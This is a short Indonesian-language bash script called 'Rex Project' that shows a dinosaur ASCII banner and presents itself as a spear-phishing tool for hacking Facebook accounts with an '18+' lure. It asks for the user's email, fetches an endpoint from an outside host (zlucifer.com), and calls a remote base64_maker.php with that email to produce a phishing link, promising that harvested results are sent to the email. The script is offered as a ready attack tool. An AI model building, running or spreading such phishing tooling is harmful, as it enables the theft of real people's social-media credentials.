#!/bin/bash
#recode lu mati
#gw buat susah anjinq
clear
echo
rex(){
echo "			               	O_ "
sleep 0.03
echo "		            	       /  > "
sleep 0.03
echo "			              -  >    ^\ "
sleep 0.03
echo "   		                    /   >  ^ /  "
sleep 0.03
echo "	       			    (O)  > ^ /   / / /  "
sleep 0.03
echo "       _____                        |            \\|// "
sleep 0.03
echo "      /  __ \                      _/      /     / _/ "
sleep 0.03
echo "     /  /  | |                    /       /     / / "
sleep 0.03
echo "   _/  |___/ /	        	_/      ------_/ /  "
sleep 0.03
echo " ==_|  \____/   	       _/       /  ______/ "
sleep 0.03
echo "     \   \                 __/           |\ "
sleep 0.03
echo "      |   \_          ____/              / \       _ "
sleep 0.03
echo "       \    \________/                  |\  \----/_V "
sleep 0.03
echo "        \_                              / \_______ V "
sleep 0.03
echo "          \__                /       \ /          V "
sleep 0.03
echo "             \               \        \ "
sleep 0.03
echo "              \______         \_       \ "
sleep 0.03
echo "                     \__________\_      \  "
sleep 0.03
echo "                        /    /    \_    |  "
sleep 0.03
echo "                       |   _/       \   | "
sleep 0.03
echo "                      /  _/          \  | "
sleep 0.03
echo "                     |  /            |  | "
sleep 0.03
echo "                     \  \__          |   \_ _ "
sleep 0.03
echo "                     /\_____\       /\______\ "
sleep 0.03
echo "=================================="
sleep 0.03
echo "==         Rex Project          =="
sleep 0.02
echo "=================================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
encrypt_mail=$(curl -s http://zlucifer.com/api/agony.php)
mulai(){
      clear
      rex
      echo "Masukan email kamu"
      read email
      echo
      echo "Apakah email "$email "sudah benar?"
      echo "y/n?"
      read cek_email
      if [ $cek_email = "y" ]; then
            clear
            echo "Membuat link.."
            load
            clear
            rex
            create=`curl -s $encrypt_mail/base64_maker.php?email=$email`
            echo -e $create
            echo "Result otomatis masuk ke email kamu"
      else
            mulai
      fi
}
clear
echo "Loading.."
load
clear
rex
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
rex
sleep 2
echo "Rex Project adalah tools untuk"
sleep 0.2
echo "Untuk Meretas Facebook"
sleep 0.2
echo "Tools ini adalah Spear Phising"
sleep 0.2
echo "Method Advanced"
sleep 0.2
echo "Menggunakan teknik 18+"
sleep 0.2
echo "Result otomatis masuk ke email kamu"
sleep 0.03
echo 
sleep 0.3
echo "Selamat datang" $nick
echo
echo "Mulai Rex Project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      clear
      echo "Memulai Rex Project.."
      load
      mulai
      fi
